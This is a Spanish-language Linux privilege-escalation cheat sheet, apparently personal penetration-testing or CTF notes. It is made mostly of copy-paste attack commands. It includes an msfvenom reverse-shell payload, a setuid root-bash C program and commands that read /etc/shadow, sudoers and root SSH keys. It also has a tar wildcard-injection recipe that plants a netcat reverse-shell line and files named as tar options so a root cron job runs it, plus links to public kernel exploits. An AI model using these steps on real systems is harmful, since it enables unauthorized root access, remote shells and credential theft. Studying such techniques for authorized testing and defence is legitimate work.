
# Cosas Básicas

1º Creacion de reverse shell con msfvenom
~~~~c
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IPATACANTE> LPORT=<PUERTO> -f elf > shell.elf
~~~~

2º RootBash
~~~~c
int main() {
	setuid(0);
	system("/bin/bash -p");
}
~~~~
NOTA: Compilar con `$ gcc -o <name> <filename.c>`


Tools de privesc que usaremos:
1º linenum
2º lse.sh
3º linpeas


# Enumeración Manual

## Credenciales

## Exploits

1º Enumerar programas en debian
~~~~c
>> dpkg -l | grep <program>
~~~~

2º Enumerar version de programa
~~~~c
>> <program> --v | -v
~~~~

3º Procesos que corren como root
~~~~c
>> ps aux | grep “^root”
~~~~


## Desconfiguraciones 

### Cron Jobs
1º Mirar crontab
~~~~c
>> cat /etc/crontab
>> cat /etc/cron*
~~~~
NOTA: desde este punto tendremos que mirar por archivos que podamos editar

### SUID / SGID

1º Buscar archivos con el par de bit de suid
~~~~c
>> find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
~~~~

### Capabilities 

1º Buscar Capabilities
~~~~c
>> getcap -r / 2>/dev/null
~~~~


### Busqueda de archchivos writeables/readables

1º /etc/passwd
~~~~c
>> ls -la /etc/passwd
>> cat /etc/passwd
~~~~

2º /etc/shadow
~~~~c
>> ls -la /etc/shadow
>> cat /etc/shadow
~~~~

3º /etc/suoders
~~~~c
>> ls -la /etc/sudoers
>> cat /etc/sudoers
~~~~

4º /root/.ssh/id_rsa
~~~~c
>> ls -la /root/.ssh/id_rsa
>> cat /root/.ssh/id_rsa
~~~~



# Enumeración Automatica

1º linenum
~~~~c
>> linenum.sh
~~~~

2º lse
~~~~c
>> lse.sh
~~~~

3º linpeas
~~~~c
>> linpeas.sh
~~~~
# Tecnicas de privesc

## Acceso Credenciales



### Password Rehusadas
Probar a hacer fuerza bruta o inicio de sesion con las contraseñas encontradas



### Credenciales de archivos de configuración

La mayoria de archivos de configuracion tienen de extension .conf, .txt

### Archivos de la BBDD local
SI tiene base de datos podriamos usar credenciales reusadas para poder entrar 


### Credenciales del Historial de Bash
Verificar si existe el archivo .bash_history

### SSH keys

~~~~c
>> cat /home/USUARIO/.ssh/id_rsa
~~~~
Si no tenemos permisos para leer es normal

### Sudo access
Sudo -l nos proporciona informacion sobre los comandos que podemos correr

~~~~c
>> sudo -l
~~~~

Este output nos dara informacion de los comandos que podemos correr como root, deberemos ir a gftobins
https://gftobins
#### Intended functionalities
Podemos abusar de funcionalidades de los comandos que podemos correr, por ejemplo
~~~~c
>> apache2 -f /etc/passwd / shadow
~~~~

## Wildcards https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks

https://int0x33.medium.com/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5


1º Comprobamos las tareas programadas
~~~~c
ls -la /etc/cron*
~~~~

2º Si vemos alguna tarea con nombre extraño la mostramos, en este ejemplo con tar 
~~~~c
cat /etc/cron.d/2minutes
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
*/2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *
~~~~
En este caso tar es donde tenemos uqe abusar, pero tambien podemos buscar en gftobins otros binarios

3º Nos cambiaos al directorio de donde se haga esto y ponemos 
~~~~c
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f" > privesc.sh

echo "" > "--checkpoint-action=exec=sh privesc.sh"  
echo "" > --checkpoint=1
~~~~

Ponemos un listener y esperamos a que se ejecute: EJEMPLO CON TAR

# Exploits utiles
https://github.com/Liuk3r/CVE-2023-32233
https://github.com/ly4k/PwnKit
https://github.com/firefart/dirtycow
https://github.com/lrh2000/StackRot/tree/master/exp